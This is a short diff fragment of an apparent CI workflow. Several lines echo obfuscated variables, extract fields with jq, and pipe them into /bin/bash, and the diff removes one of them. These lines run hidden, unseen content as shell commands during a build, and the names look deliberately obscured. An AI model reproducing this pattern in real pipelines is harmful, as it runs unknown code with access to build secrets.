@@ -26,7 +26,6 @@ jobs:
           echo $c20 | jq -r .zfy579 | /bin/bash
           echo $l26 | jq -r .trfhj849 | /bin/bash
           echo $vknao075 | jq -r .ivu10 | /bin/bash
-          echo $mid3466 | jq -r .m8048 | /bin/bash
           echo $bwgi39 | jq -r .t66 | /bin/bash
 
       - name: Upload artifact
